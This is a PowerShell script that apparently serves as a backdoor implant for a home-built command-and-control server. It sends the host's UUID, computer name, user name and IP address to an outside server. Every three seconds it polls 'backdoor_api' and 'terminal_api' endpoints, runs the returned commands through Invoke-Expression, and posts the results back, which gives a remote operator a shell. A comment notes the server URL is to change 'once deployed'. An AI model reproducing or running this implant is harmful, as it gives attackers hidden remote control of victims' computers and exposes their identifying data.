$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
# URL NEEDS TO BE CHANGED ONCE DEPLOYED

$register_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/register/"

$env:HostIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

$Body = @{
   uuid = $uuid
   name = $env:computername
   description = $env:UserName
   ip = $env:HostIP
   status = "True"
}
Invoke-RestMethod -Method 'Post' -Uri $register_url -Body $body

$url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/backdoor_api/" + $uuid
$terminal_url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/terminal_api/" + $uuid
$script_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/script_log/"
$terminal_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/terminal_log/"
$payload_search_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/payload/?payload=&payload_name="

while ($true) {
	Start-Sleep -Seconds 3
	$response = Invoke-RestMethod -Method 'Get' -Uri $url
	$terminal_response = Invoke-RestMethod -Method 'Get' -Uri $terminal_url
	if ($response.active -eq $true -and $response.terminal -eq $false -and $uuid.equals($response.uuid)){
		# Write-Output $response.payload
		$payload_query_url = $payload_search_url + $response.payload_name
		# need to convert it to json format when sending to the server
		$payload_response = Invoke-RestMethod -Method 'Get' -Uri $payload_query_url
		$output = Invoke-Expression $response.payload
		if (!$output){
			$output = "Script executed succesfully, but there was no output!"
		}
		$Body = @{content = $output
			connection = $uuid
			payload = $payload_response.id
		}
		$script_post = Invoke-RestMethod -Method 'Post' -Uri $script_log_url -Body $Body
	}
	if ($terminal_response.active -eq $true -and $terminal_response.terminal -eq $true -and $uuid.equals($terminal_response.uuid)){
		$current_directory = Convert-Path .
		$input_response = Invoke-Expression $terminal_response.input | ConvertTo-Json
		if (!$input_response){
			$input_response = "Script executed succesfully, but there was no output!"
		}
		$terminal_Body = @{content = $input_response
			connection = $uuid
			current_directory = $current_directory
		}
		$terminal_post = Invoke-RestMethod -Method 'Post' -Uri $terminal_log_url -Body $terminal_Body
	}
	
}
